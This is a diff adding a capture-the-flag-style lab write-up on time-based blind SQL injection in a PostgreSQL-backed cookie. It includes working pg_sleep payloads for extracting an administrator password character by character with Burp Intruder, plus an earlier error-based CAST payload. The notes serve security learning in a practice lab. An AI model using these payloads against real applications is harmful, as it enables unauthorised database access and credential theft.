@@ -295,6 +295,39 @@ TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
 - Added `LIMIT 1` after getting a "more than one row returned" error, since `CAST` only accepts a single scalar
 - Error message leaked `administrator` as the username, then reused the same trick on the `password` column
 
+## Lab 10: Blind SQL injection with time delays and information retrieval
+
+**Category:** Blind SQL Injection (Time-based)
+**Database:** PostgreSQL
+**Objective:** Exploit a blind SQLi vulnerability in the `TrackingId` cookie to extract the administrator's password using conditional time delays, then log in.
+
+### Payload
+```sql
+-- Confirm injection point works
+x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
+
+-- Confirm password length (iterate N)
+x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>N)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+
+-- Extract each character (Burp Intruder, position N, payload set a-z0-9)
+x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,N,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+```
+
+### Approach
+- App gives no visible output or error difference — the only observable signal is response time, so this is true blind (time-based) SQLi
+- Stacked query (`;SELECT...`) piggybacks a conditional `CASE WHEN` onto the original query
+- `pg_sleep(10)` vs `pg_sleep(0)` acts as a binary oracle: 10s delay = condition TRUE, instant = FALSE
+- Confirmed the `administrator` user exists, then found password length via incremental `LENGTH(password)>N` checks (20 chars)
+- Used Burp Intruder with `§a§` payload markers on `SUBSTRING(password,N,1)` to brute-force each character position (charset: `a-z0-9`)
+- Critical config: set Intruder's Resource Pool to 1 concurrent request — parallel requests would desync the timing signal and give false positives
+- Repeated across all 20 offsets, reading the "Response received" column for the ~10,000ms outlier each round
+
+### Result
+Extracted the full 20-character administrator password character-by-character, logged in via `/my-account`, lab marked Solved.
+
+### Key Takeaway
+Time-based blind SQLi is the fallback oracle when there's zero content/error differential — you're using the DB's own execution delay as your only channel out. It's slow and Intruder-heavy, which is exactly why a real engagement reaches for `sqlmap --technique=T` instead of doing this by hand at scale. Also worth remembering: this only works because stacked queries are allowed here — Postgres via most web frameworks (Django, Rails) blocks multi-statement execution by default.
+
 ### Result
 Extracted the administrator's password directly from the database's own error output, logged in, lab solved.
 
